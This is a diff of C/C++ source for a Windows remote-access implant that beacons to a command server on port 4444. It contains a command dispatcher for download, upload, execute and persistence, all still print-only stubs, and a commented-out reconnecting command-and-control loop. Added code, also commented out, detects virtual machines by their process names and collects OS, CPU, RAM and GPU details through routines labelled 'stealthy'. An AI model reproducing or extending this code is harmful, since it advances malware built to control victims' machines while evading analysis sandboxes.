@@ -13,120 +13,9 @@
 #define SERVER_PORT 4444
 #define BUFFER_SIZE 1024
 
-// TODO: move this somewhere else. and maybe make them enums?
-#define SUCCESSFUL 0
 
-// Command structure
-typedef struct {
-    char action[50];
-    char target[100];
-    char options[200];
-} Command;
-
-// Parse commands from server
-Command parse_command(char* buffer) {
-    Command cmd = {0};
-    
-    // Simple parsing: "action:target:options"
-    char* token = strtok(buffer, ":");
-    if (token) strncpy(cmd.action, token, sizeof(cmd.action) - 1);
-    
-    token = strtok(NULL, ":");
-    if (token) strncpy(cmd.target, token, sizeof(cmd.target) - 1);
-    
-    token = strtok(NULL, "\n");
-    if (token) strncpy(cmd.options, token, sizeof(cmd.options) - 1);
-    
-    return cmd;
-}
-
-// Execute commands
-void execute_command(Command cmd) {
-    printf("Executing: %s -> %s [%s]\n", cmd.action, cmd.target, cmd.options);
-    
-    if (strcmp(cmd.action, "download") == 0) {
-        printf("[+] Downloading: %s\n", cmd.target);
-    }
-    else if (strcmp(cmd.action, "upload") == 0) {
-        printf("[+] Uploading: %s\n", cmd.target);
-    }
-    else if (strcmp(cmd.action, "execute") == 0) {
-        printf("[+] Executing: %s\n", cmd.target);
-    }
-    else if (strcmp(cmd.action, "systeminfo") == 0) {
-        printf("[+] Gathering system information...\n");
-    }
-    else if (strcmp(cmd.action, "persist") == 0) {
-        printf("[+] Establishing persistence...\n");
-    }
-    else {
-        printf("[-] Unknown command: %s\n", cmd.action);
-    }
-}
-
-// Send response back to server
-void send_response(SOCKET sock, char* message) {
-    char response[BUFFER_SIZE];
-    snprintf(response, sizeof(response), "RESPONSE:%s\n", message);
-    send(sock, response, strlen(response), 0);
-}
-
-/*
-int main() {
-    WSADATA wsa;
-    SOCKET sock;
-    struct sockaddr_in server;
-    char buffer[BUFFER_SIZE];
-    
-    WSAStartup(MAKEWORD(2,2), &wsa);
-    
-    while (1) {
-        sock = socket(AF_INET, SOCK_STREAM, 0);
-        server.sin_addr.s_addr = inet_addr(SERVER_IP);
-        server.sin_family = AF_INET;
-        server.sin_port = htons(SERVER_PORT);
-        
-        if (connect(sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
-            printf("[-] Connection failed, retrying in 10s...\n");
-            closesocket(sock);
-            Sleep(10000);
-            continue;
-        }
-        
-        printf("[+] Connected to server\n");
-        send(sock, "READY\n", 6, 0);
-        
-        // Command loop
-        while (1) {
-            memset(buffer, 0, sizeof(buffer));
-            int size = recv(sock, buffer, sizeof(buffer) - 1, 0);
-            
-            if (size <= 0) {
-                printf("[-] Connection lost\n");
-                break;
-            }
-            
-            buffer[size] = '\0';
-            printf("[+] Received: %s", buffer);
-            
-            // Parse and execute command
-            Command cmd = parse_command(buffer);
-            execute_command(cmd);
-            
-            // Send acknowledgement
-            send_response(sock, "Command executed");
-        }
-        
-        closesocket(sock);
-        Sleep(5000); // Wait before reconnecting
-    }
-    
-    WSACleanup();
-    return 0;
-}*/
-
-
-// x86_64-w64-mingw32-g++ -static -o client.exe client.cpp -lws2_32
+// TODO: -static makes file 2-5x larger
+// x86_64-w64-mingw32-g++ -static -o client.exe client.cpp -lws2_32 
 // client.cpp
 
 Client::Client() : 
@@ -244,6 +133,24 @@ void Client::sendData(const std::string& data) {
     //return result;  // Returns number of bytes actually sent
 }
 
+/*
+// TODO: logic to pause socket instead of sleeping it?
+void setPaused(bool pause) {
+    u_long mode = pause ? 1 : 0;
+    ioctlsocket(socket_, FIONBIO, &mode);
+}
+
+std::string receiveDataNonBlocking() {
+    char buffer[4096];
+    int result = recv(socket_, buffer, sizeof(buffer), 0);
+    if (result > 0) {
+        return std::string(buffer, result);
+    }
+    return "";  // No data available immediately
+}
+
+*/
+
 void Client::run(const std::string& host, const std::string& port)
 {
     // Ensure socket is created
@@ -276,68 +183,191 @@ void Client::run(const std::string& host, const std::string& port)
     std::cout << "Disconnected from server" << std::endl;
 } 
 
+// void Client::getInfo() ? 
+void Client::getSystemInfo()
+{
+}
 
 /*
-using namespace std;
-
-// BasicImplant implementation
-BasicImplant::BasicImplant(const string& host, int port) 
-    : c2_host(host), c2_port(port), checkin_interval(60), running(false) {
+bool isRunningInVM() {
+    // Check common VM process names
+    const char* vmProcesses[] = {
+        "vboxservice.exe", "vboxtray.exe", 
+        "vmwaretray.exe", "vmwareuser.exe",
+        "xenservice.exe", "qemu-ga.exe"
+    };
     
-    implant_id = ImplantUtils::generate_implant_id();
-    
-    WSADATA wsa_data;
-    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
-        throw runtime_error("WSAStartup failed: " + to_string(WSAGetLastError()));
+    // Check for VM-specific hardware
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+        "HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        // Check system BIOS/vendor info
+        RegCloseKey(hKey);
     }
-}
-
-BasicImplant::~BasicImplant() {
-    stop();
-    WSACleanup();
-}
-
-string BasicImplant::get_username() {
-    CHAR username[UNLEN + 1];
-    DWORD username_len = UNLEN + 1;
-    if (GetUserNameA(username, &username_len)) {
-        return string(username);
-    }
-    return "unknown";
-}
-
-string BasicImplant::get_architecture(SYSTEM_INFO& sys_info) {
-    switch (sys_info.wProcessorArchitecture) {
-        case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
-        case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
-        case PROCESSOR_ARCHITECTURE_ARM: return "ARM";
-        case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
-        default: return "unknown";
-    }
-}
-
-string BasicImplant::get_os_version(OSVERSIONINFOA& os_info) {
-    return "Windows " + to_string(os_info.dwMajorVersion) + "." + 
-           to_string(os_info.dwMinorVersion) + " Build " + 
-           to_string(os_info.dwBuildNumber);
-}
-
-string BasicImplant::get_system_info() {
-    SYSTEM_INFO sys_info;
-    GetSystemInfo(&sys_info);
     
-    OSVERSIONINFOA os_info;
-    os_info.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);
-    GetVersionExA(&os_info);
+    return false; // Placeholder
+}
+
+DWORD getWindowsBuildNumber() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return 0;
     
-    string info = "user:" + get_username();
-    info += "|arch:" + get_architecture(sys_info);
-    info += "|os:" + get_os_version(os_info);
-    info += "|pid:" + to_string(GetCurrentProcessId());
-    info += "|tickcount:" + to_string(GetTickCount());
+    FARPROC pRtlGetVersion = GetProcAddress(hNtdll, "RtlGetVersion");
+    if (!pRtlGetVersion) return 0;
+    
+    // TODO: can always add/subtract attributes from struct ver as needed
+    // Minimal structure - only what we need
+    struct { 
+        DWORD dwSize; 
+        DWORD dwBuild; 
+    } ver = { sizeof(ver) };
+    
+    if (((LONG (NTAPI*)(void*))pRtlGetVersion)(&ver) == 0) {
+        return ver.dwBuild;
+    }
+    return 0;
+}
+
+// GetSystemInfo() // get cpu info
+typedef struct _RTL_OSVERSIONINFOW {
+    DWORD dwOSVersionInfoSize;
+    DWORD dwMajorVersion;
+    DWORD dwMinorVersion;
+    DWORD dwBuildNumber;
+    DWORD dwPlatformId;
+    WCHAR szCSDVersion[128];
+} RTL_OSVERSIONINFOW;
+
+DWORD getWindowsBuildStealthy() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    if (!hNtdll) return 0;
+    
+    auto pRtlGetVersion = (LONG (NTAPI*)(RTL_OSVERSIONINFOW*))GetProcAddress(hNtdll, "RtlGetVersion");
+    if (!pRtlGetVersion) return 0;
+    
+    RTL_OSVERSIONINFOW versionInfo = {0};
+    versionInfo.dwOSVersionInfoSize = sizeof(versionInfo);
+    
+    if (pRtlGetVersion(&versionInfo) == 0) {
+        return versionInfo.dwBuildNumber;
+    }
+    return 0;
+}
+
+// GetNativeSystemInfo():
+struct StealthSystemInfo {
+    DWORD processorCount;
+    WORD architecture;
+    DWORD pageSize;
+    DWORD minAppAddr;
+    DWORD maxAppAddr;
+};
+
+StealthSystemInfo getStealthSystemInfo() {
+    StealthSystemInfo info = {0};
+    SYSTEM_INFO sysInfo;
+    
+    // Single API call - very stealthy
+    GetNativeSystemInfo(&sysInfo);
+    
+    info.processorCount = sysInfo.dwNumberOfProcessors;
+    info.architecture = sysInfo.wProcessorArchitecture;
+    info.pageSize = sysInfo.dwPageSize;
+    info.minAppAddr = (DWORD)sysInfo.lpMinimumApplicationAddress;
+    info.maxAppAddr = (DWORD)sysInfo.lpMaximumApplicationAddress;
     
     return info;
 }
+
+// getRam()
+DWORD getTotalRAMStealthy() {
+    MEMORYSTATUSEX statex;
+    statex.dwLength = sizeof(statex);
+    
+    if (GlobalMemoryStatusEx(&statex)) {
+        return (DWORD)(statex.ullTotalPhys / (1024 * 1024));  // Convert to MB
+    }
+    return 0;
+}
+
+getOsBit():
+bool is64BitOS() {
+    SYSTEM_INFO sysInfo;
+    GetNativeSystemInfo(&sysInfo);
+    
+    // This tells you the NATIVE OS architecture:
+    return (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
+            sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64);
+}
+
+// TODO: getTickCount() // (amount of time the system has been running?)
+
+// TODO: getGPU()
+#include <windows.h>
+
+const char* getGPUNameStealthy() {
+    static char gpuName[128] = "Unknown";
+    HKEY hKey;
+    DWORD size = sizeof(gpuName);
+    
+    // Single, direct registry query
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+        "SYSTEM\\CurrentControlSet\\Control\\Video", 
+        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        
+        HKEY hSubKey;
+        DWORD index = 0;
+        char subKeyName[256];
+        DWORD subKeySize = sizeof(subKeyName);
+        
+        // Enumerate first video subkey only
+        if (RegEnumKeyExA(hKey, index, subKeyName, &subKeySize, 
+            NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
+            
+            char fullPath[512];
+            snprintf(fullPath, sizeof(fullPath), 
+                     "SYSTEM\\CurrentControlSet\\Control\\Video\\%s\\0000", 
+                     subKeyName);
+            
+            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, fullPath, 
+                0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
+                
+                // Get GPU description
+                if (RegQueryValueExA(hSubKey, "DriverDesc", NULL, NULL, 
+                    (LPBYTE)gpuName, &size) != ERROR_SUCCESS) {
+                    strcpy(gpuName, "Unknown");
+                }
+                RegCloseKey(hSubKey);
+            }
+        }
+        RegCloseKey(hKey);
+    }
+    return gpuName;
+}
+
+// TODO: getGPUStealthier()
+const char* getGPUNameUltraStealthy() {
+    static char gpuName[64] = "Unknown";
+    HKEY hKey;
+    DWORD size = sizeof(gpuName);
+    
+    // Try most common path directly (avoids enumeration)
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+        "SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000",
+        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        
+        RegQueryValueExA(hKey, "DriverDesc", NULL, NULL, 
+                        (LPBYTE)gpuName, &size);
+        RegCloseKey(hKey);
+    }
+    return gpuName;
+}
+
+
+ */
+
+
+/*
 
 string BasicImplant::execute_command(const string& command) {
     string result;
